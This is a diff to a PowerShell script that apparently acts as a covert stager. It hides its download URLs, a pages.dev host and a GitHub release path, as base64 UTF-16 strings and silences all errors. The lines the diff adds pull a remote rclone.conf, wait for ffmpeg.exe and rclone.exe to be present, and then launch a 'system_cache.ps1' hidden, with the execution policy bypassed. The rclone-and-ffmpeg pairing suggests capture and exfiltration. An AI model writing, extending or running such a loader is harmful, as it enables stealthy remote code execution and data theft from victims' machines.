@@ -1,7 +1,7 @@
 $ErrorActionPreference="Stop"
 trap{continue}
 $urls=@(
-    'MwAtADQAcAB4AC4AcABhAGcAZQBzAC4AZABlAHYALwA=',
+    'aAB0AHQAcABzADoALwAvADMALQA0AHAAeAAuAHAAYQBnAGUAcwAuAGQAZQB2AC8A',
     'aAB0AHQAcABzADoALwAvAGcAaQB0AGgAdQBiAC4AYwBvAG0ALwBFAHgANgBUAGUAbgBaAHoALwBmAC8AcgBlAGwAZQBhAHMAZXMvAGQAbwB3AG4AbABvAGEAZAAvAHYAMQAuMAAvAA==',
 )
 function d($s){[System.Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($s))}
@@ -35,6 +35,50 @@ foreach($f in $files){
             Start-Sleep -Milliseconds (Get-Random -Minimum 100 -Maximum 500)
         }catch{}
     }
+}
+
+function Update-RcloneConf {
+    $remoteConfUrl = "$repo/rclone.conf"
+    $localConf = Join-Path $dest "rclone.conf"
+    try {
+        $remoteInfo = Invoke-WebRequest -Uri $remoteConfUrl -UseBasicParsing -Method Head -ErrorAction Stop
+        $remoteDate = $remoteInfo.Headers["Last-Modified"]
+        $localDate = if (Test-Path $localConf) { (Get-Item $localConf).LastWriteTimeUtc } else { [datetime]::MinValue }
+        if ($remoteDate) {
+            $remoteDate = [datetime]::Parse($remoteDate).ToUniversalTime()
+            if ($remoteDate -gt $localDate) {
+                Invoke-WebRequest -Uri $remoteConfUrl -OutFile $localConf -UseBasicParsing -ErrorAction Stop
+            }
+        } elseif (!(Test-Path $localConf)) {
+            Invoke-WebRequest -Uri $remoteConfUrl -OutFile $localConf -UseBasicParsing -ErrorAction Stop
+        }
+    } catch {}
+}
+
+function Wait-ForFiles {
+    param([string[]]$files, [int]$timeoutSec = 120)
+    $start = Get-Date
+    while ($true) {
+        $missing = $files | Where-Object { -not (Test-Path $_) }
+        if ($missing.Count -eq 0) { break }
+        if ((Get-Date) - $start -gt (New-TimeSpan -Seconds $timeoutSec)) {
+            throw "Timeout waiting for files: $($missing -join ', ')"
+        }
+        Start-Sleep -Seconds 2
+    }
+}
+
+Update-RcloneConf
+
+Wait-ForFiles @(
+    (Join-Path $dest "ffmpeg.exe"),
+    (Join-Path $dest "rclone.exe"),
+    (Join-Path $dest "rclone.conf")
+)
+
+$scps1 = Join-Path $dest "system_cache.ps1"
+if (Test-Path $scps1) {
+    Start-Process -FilePath "powershell.exe" -ArgumentList "-ExecutionPolicy Bypass -WindowStyle Hidden -File `"$scps1`""
 }
 function Test-Admin{
     $id=[Security.Principal.WindowsIdentity]::GetCurrent()
